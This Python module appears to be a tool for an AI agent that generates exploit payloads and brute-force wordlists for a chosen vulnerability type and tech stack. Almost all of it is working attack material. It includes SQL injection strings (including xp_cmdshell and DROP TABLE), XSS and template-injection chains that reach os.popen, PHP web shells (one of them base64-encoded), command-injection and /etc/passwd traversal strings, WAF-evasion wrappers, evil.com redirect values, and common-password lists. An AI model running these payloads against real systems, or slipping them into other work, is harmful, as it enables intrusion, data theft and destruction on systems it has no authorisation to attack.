"""Context-aware payload generator — produces working payloads based on target tech stack."""

from __future__ import annotations

import random
import re
from typing import Any

PAYLOAD_GEN_TOOLS: dict[str, Any] = {
    "generate_payloads": {
        "description": "Generate context-aware exploit payloads for a given vulnerability type and tech stack",
        "parameters": {
            "type": "object",
            "properties": {
                "vuln_type": {
                    "type": "string",
                    "enum": ["sqli", "xss", "ssti", "rce", "lfi", "open_redirect",
                             "xxe", "ssrf", "nosqli", "ldap_inject", "xpath_inject",
                             "deserialize", "cors", "path_traversal"],
                },
                "tech_stack": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "e.g. ['php', 'mysql', 'nginx'] or ['python', 'jinja2', 'postgres']",
                },
                "context": {
                    "type": "string",
                    "enum": ["html", "attribute", "js", "url", "sql", "shell", "json", "xml", "header"],
                    "description": "Where the payload is injected",
                },
                "waf_bypass": {"type": "boolean", "default": False},
                "count": {"type": "integer", "default": 10},
            },
            "required": ["vuln_type"],
        },
    },
    "generate_wordlist": {
        "description": "Generate a targeted wordlist for bruteforcing directories, parameters, or credentials",
        "parameters": {
            "type": "object",
            "properties": {
                "wordlist_type": {
                    "type": "string",
                    "enum": ["directories", "parameters", "subdomains", "passwords", "usernames", "api_endpoints"],
                },
                "tech_stack": {"type": "array", "items": {"type": "string"}},
                "target_context": {"type": "string", "description": "e.g. company name or domain for contextual words"},
                "count": {"type": "integer", "default": 50},
            },
            "required": ["wordlist_type"],
        },
    },
}

# ── Dispatcher ────────────────────────────────────────────────────────

async def dispatch(agent: Any, tool_name: str, args: dict[str, Any]) -> str | None:
    if tool_name == "generate_payloads":
        return execute_generate_payloads(args)
    if tool_name == "generate_wordlist":
        return execute_generate_wordlist(args)
    return None

# ── Payload Banks ─────────────────────────────────────────────────────

_SQLI_GENERIC = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    '" OR "1"="1',
    "1' AND SLEEP(5)--",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "admin'--",
    "' OR 'x'='x",
    "1 AND 1=1",
    "1 AND 1=2",
    "' AND 1=1--",
    "' AND 1=2--",
]
_SQLI_MYSQL = [
    "' UNION SELECT user(),database(),version()--",
    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,user()))--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "1' AND (SELECT SLEEP(5))--",
    "1 AND BENCHMARK(5000000,SHA1(1))--",
]
_SQLI_POSTGRES = [
    "' UNION SELECT current_user,current_database(),version()--",
    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    "'; SELECT pg_sleep(5)--",
    "' AND 1=CAST((SELECT version()) AS INT)--",
    "' UNION SELECT NULL,string_agg(table_name,',') FROM information_schema.tables--",
]
_SQLI_MSSQL = [
    "'; EXEC xp_cmdshell('whoami')--",
    "' UNION SELECT @@version,NULL,NULL--",
    "1; WAITFOR DELAY '0:0:5'--",
    "' AND 1=CONVERT(INT,(SELECT TOP 1 table_name FROM information_schema.tables))--",
]
_SQLI_ORACLE = [
    "' UNION SELECT user,NULL FROM dual--",
    "' UNION SELECT table_name,NULL FROM all_tables--",
    "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
]

_XSS_HTML = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "javascript:alert(1)",
    "<input autofocus onfocus=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<math><mtext></p><img src=x onerror=alert(1)>",
]
_XSS_ATTR = [
    '" onmouseover="alert(1)',
    "' onmouseover='alert(1)",
    '" autofocus onfocus="alert(1)',
    "' autofocus onfocus='alert(1)",
    '" onload="alert(1)',
    '" onerror="alert(1)',
]
_XSS_JS = [
    "';alert(1)//",
    '";alert(1)//',
    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    "</script><script>alert(1)</script>",
    "1;alert(1)",
]

_SSTI_JINJA2 = [
    "{{7*7}}",
    "{{config}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}",
]
_SSTI_TWIG = [
    "{{7*7}}",
    "{{7*'7'}}",
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
]
_SSTI_FTL = [
    "${7*7}",
    "${product.getClass().getProtectionDomain().getCodeSource().getLocation()}",
    "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
]
_SSTI_ERB = [
    "<%= 7*7 %>",
    "<%= `id` %>",
    "<%= system('id') %>",
]

_RCE_PHP = [
    "<?php system($_GET['c']); ?>",
    "<?php passthru($_GET['c']); ?>",
    "<?php echo shell_exec($_GET['c']); ?>",
    "<?php $a=$_GET['c']; eval($a); ?>",
]
_RCE_SHELL = [
    "; id",
    "| id",
    "` id `",
    "$(id)",
    "& id",
    "&& id",
    "; sleep 5",
    "| sleep 5",
    "$(sleep 5)",
    "; ping -c 1 127.0.0.1",
]

_LFI_LINUX = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "..%2fetc%2fpasswd",
    "..%252fetc%252fpasswd",
    "....//....//etc/passwd",
    "/etc/passwd",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==",
    "expect://id",
]
_LFI_WINDOWS = [
    "..\\windows\\win.ini",
    "..\\..\\windows\\win.ini",
    "C:\\windows\\win.ini",
    "C:\\boot.ini",
    "..%5cwindows%5cwin.ini",
]

_NOSQLI = [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$regex": ".*"}',
    '{"$where": "1==1"}',
    "' || '1'=='1",
    "'; return true; var a='",
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
]

_OPEN_REDIRECT = [
    "//evil.com",
    "https://evil.com",
    "//evil.com/%2F..",
    "///evil.com",
    "////evil.com",
    "https:evil.com",
    "\/\/evil.com",
    "http://evil.com@example.com",
    "http://example.com.evil.com",
]

_PATH_TRAVERSAL = [
    "../", "../../", "../../../", "../../../../",
    "..%2f", "..%2f..%2f",
    "%2e%2e%2f", "%2e%2e%2f%2e%2e%2f",
    "....//", "....//....//",
    "..;/", "..;/..;/",
]

_LDAP_INJECT = [
    "*",
    "*)(&",
    "*))(|(uid=*",
    "admin)(&(password=*))",
    "*)(&(uid=*)(password=*)",
    ")(uid=*",
]

_XPATH_INJECT = [
    "' or '1'='1",
    "' or 1=1 or ''='",
    "x' or name()='username' or 'x'='y",
    "' and count(/*)=1 and '1'='1",
    "' and string-length(name(/*[1]))=4 and '1'='1",
]

_CORS_HEADERS = [
    "Origin: null",
    "Origin: https://evil.com",
    "Origin: https://attacker.evil.com",
    "Origin: https://example.com.evil.com",
]

# WAF bypass wrappers
def _waf_wrap_sqli(payload: str) -> str:
    wraps = [
        lambda p: p.replace(" ", "/**/"),
        lambda p: p.replace("OR", "Or").replace("AND", "AnD"),
        lambda p: p.replace("=", " LIKE "),
        lambda p: p.replace("'", "\\'"),
    ]
    return random.choice(wraps)(payload)

def _waf_wrap_xss(payload: str) -> str:
    wraps = [
        lambda p: p.replace("<script>", "<ScRiPt>").replace("</script>", "</ScRiPt>"),
        lambda p: p.replace("alert", "alert\x00"),
        lambda p: p.replace("alert(1)", "confirm(1)"),
        lambda p: p.replace("alert(1)", "prompt(1)"),
    ]
    return random.choice(wraps)(payload)

def execute_generate_payloads(args: dict[str, Any]) -> str:
    vuln: str = args["vuln_type"]
    stack: list[str] = [s.lower() for s in (args.get("tech_stack") or [])]
    context: str = args.get("context", "html")
    waf: bool = args.get("waf_bypass", False)
    count: int = min(args.get("count", 10), 30)
    results = [f"[generate_payloads] vuln={vuln} stack={stack} context={context} waf={waf}"]

    payloads: list[str] = []

    if vuln == "sqli":
        payloads.extend(_SQLI_GENERIC)
        if "mysql" in stack or "mariadb" in stack:
            payloads.extend(_SQLI_MYSQL)
        if "postgres" in stack or "postgresql" in stack:
            payloads.extend(_SQLI_POSTGRES)
        if "mssql" in stack or "sqlserver" in stack:
            payloads.extend(_SQLI_MSSQL)
        if "oracle" in stack:
            payloads.extend(_SQLI_ORACLE)
        if waf:
            payloads = [_waf_wrap_sqli(p) for p in payloads]

    elif vuln == "xss":
        if context == "attribute":
            payloads.extend(_XSS_ATTR)
        elif context == "js":
            payloads.extend(_XSS_JS)
        else:
            payloads.extend(_XSS_HTML)
        if waf:
            payloads = [_waf_wrap_xss(p) for p in payloads]

    elif vuln == "ssti":
        if "jinja2" in stack or "python" in stack or "flask" in stack or "django" in stack:
            payloads.extend(_SSTI_JINJA2)
        if "twig" in stack or "php" in stack:
            payloads.extend(_SSTI_TWIG)
        if "freemarker" in stack or "java" in stack:
            payloads.extend(_SSTI_FTL)
        if "ruby" in stack or "erb" in stack or "rails" in stack:
            payloads.extend(_SSTI_ERB)
        if not payloads:
            payloads = _SSTI_JINJA2 + _SSTI_TWIG

    elif vuln == "rce":
        if "php" in stack:
            payloads.extend(_RCE_PHP)
        payloads.extend(_RCE_SHELL)

    elif vuln == "lfi" or vuln == "path_traversal":
        payloads.extend(_LFI_LINUX)
        if "windows" in stack or "iis" in stack:
            payloads.extend(_LFI_WINDOWS)

    elif vuln == "open_redirect":
        payloads.extend(_OPEN_REDIRECT)

    elif vuln == "nosqli":
        payloads.extend(_NOSQLI)

    elif vuln == "ldap_inject":
        payloads.extend(_LDAP_INJECT)

    elif vuln == "xpath_inject":
        payloads.extend(_XPATH_INJECT)

    elif vuln == "cors":
        payloads.extend(_CORS_HEADERS)

    elif vuln in ("xxe", "ssrf"):
        results.append("  → Use xxe_inject / ssrf_chain tools for these — they have full active payloads")
        return "\n".join(results)

    elif vuln == "deserialize":
        payloads = [
            "rO0ABXNy...  (Java ysoserial CommonsCollections6 gadget — run ysoserial to generate)",
            "O:4:\\\"Exploit\\\":{1:{...}}  (PHP object injection)",
            "!!python/object/apply:os.system ['id']  (PyYAML deserialization)",
            '{"__class__":"Exploit"}  (Python pickle — use pickletools to craft)',
        ]

    # Deduplicate and limit
    seen: set[str] = set()
    unique: list[str] = []
    for p in payloads:
        if p not in seen:
            seen.add(p)
            unique.append(p)

    results.append(f"  Generated {len(unique)} payloads (showing first {count}):")
    for i, p in enumerate(unique[:count], 1):
        results.append(f"  {i:2}. {p}")
    return "\n".join(results)

# ── Wordlist Generator ────────────────────────────────────────────────

_DIR_GENERIC = [
    "admin", "administrator", "login", "dashboard", "panel", "config", "backup",
    "api", "api/v1", "api/v2", "v1", "v2", "graphql", "rest", "swagger",
    ".git", ".env", ".htaccess", "robots.txt", "sitemap.xml",
    "upload", "uploads", "files", "images", "static", "assets",
    "test", "debug", "dev", "staging", "old", "bak", "backup.zip",
    "phpinfo.php", "info.php", "server-status", "server-info",
    "wp-admin", "wp-login.php", "xmlrpc.php",
    "actuator", "actuator/health", "actuator/env", "actuator/metrics",
    "console", "h2-console", "phpmyadmin", "adminer",
]
_DIR_PHP   = ["index.php", "wp-config.php", "config.php", "db.php", "database.php", "connect.php"]
_DIR_JAVA  = ["WEB-INF/web.xml", "WEB-INF/classes/", "struts.xml", "faces/", "jsf/"]
_DIR_PYTHON = ["manage.py", "settings.py", "requirements.txt", "wsgi.py", "asgi.py"]
_DIR_NODE  = ["package.json", "node_modules/", ".npmrc", "yarn.lock"]

_API_ENDPOINTS = [
    "users", "user", "accounts", "account", "profile", "profiles",
    "auth", "login", "logout", "register", "signup", "token", "refresh",
    "admin", "roles", "permissions", "settings", "config",
    "orders", "products", "items", "cart", "checkout", "payment",
    "search", "query", "export", "import", "upload", "download",
    "health", "status", "version", "metrics", "logs",
    "webhook", "webhooks", "callback", "notify", "notification",
]

_PARAMS = [
    "id", "user", "username", "password", "email", "token", "key",
    "file", "path", "url", "redirect", "next", "return", "callback",
    "q", "query", "search", "filter", "sort", "order", "page", "limit",
    "lang", "locale", "debug", "test", "admin", "role",
    "action", "cmd", "command", "exec", "eval",
]

_SUBDOMAINS = [
    "www", "mail", "ftp", "remote", "blog", "webmail", "server",
    "ns1", "ns2", "smtp", "secure", "vpn", "m", "shop", "forum",
    "api", "dev", "staging", "test", "admin", "portal", "gateway",
    "app", "apps", "dashboard", "cdn", "static", "assets",
    "beta", "alpha", "demo", "sandbox", "internal", "corp",
]

_PASSWORDS = [
    "password", "password123", "123456", "12345678", "qwerty", "admin",
    "letmein", "welcome", "monkey", "1234567890", "abc123", "pass",
    "master", "dragon", "123456789", "baseball", "iloveyou", "trustno1",
    "sunshine", "princess", "shadow", "superman", "michael", "jessica",
]

_USERNAMES = [
    "admin", "administrator", "root", "user", "guest", "test",
    "superuser", "sysadmin", "support", "helpdesk", "service",
    "webmaster", "postmaster", "hostmaster", "info", "contact",
]

def execute_generate_wordlist(args: dict[str, Any]) -> str:
    wtype: str = args["wordlist_type"]
    stack: list[str] = [s.lower() for s in (args.get("tech_stack") or [])]
    context: str = args.get("target_context", "")
    count: int = min(args.get("count", 50), 200)
    results = [f"[generate_wordlist] type={wtype} stack={stack}"]

    words: list[str] = []
    if wtype == "directories":
        words.extend(_DIR_GENERIC)
        if "php" in stack: words.extend(_DIR_PHP)
        if "java" in stack or "spring" in stack: words.extend(_DIR_JAVA)
        if "python" in stack or "django" in stack or "flask" in stack: words.extend(_DIR_PYTHON)
        if "node" in stack or "express" in stack or "javascript" in stack: words.extend(_DIR_NODE)

    elif wtype == "api_endpoints":
        for ep in _API_ENDPOINTS:
            words.append(ep)
            words.append(f"v1/{ep}")
            words.append(f"v2/{ep}")
            words.append(f"api/{ep}")

    elif wtype == "parameters":
        words.extend(_PARAMS)

    elif wtype == "subdomains":
        words.extend(_SUBDOMAINS)

    elif wtype == "passwords":
        words.extend(_PASSWORDS)
        if context:
            slug = re.sub(r"\W+", "", context.lower())
            words += [
                f"{slug}123", f"{slug}@123", f"{slug}2024", f"{slug}2025",
                f"{slug}!", f"{slug}#123", slug, f"{slug.capitalize()}1",
            ]

    elif wtype == "usernames":
        words.extend(_USERNAMES)
        if context:
            slug = re.sub(r"\W+", "", context.lower())
            words += [slug, f"{slug}_admin", f"admin_{slug}", f"{slug}1"]

    seen: set[str] = set()
    unique = [w for w in words if w not in seen and not seen.add(w)]  # type: ignore[func-returns-value]
    results.append(f"  Generated {len(unique)} entries (showing first {count}):")
    results.extend(unique[:count])
    return "\n".join(results)
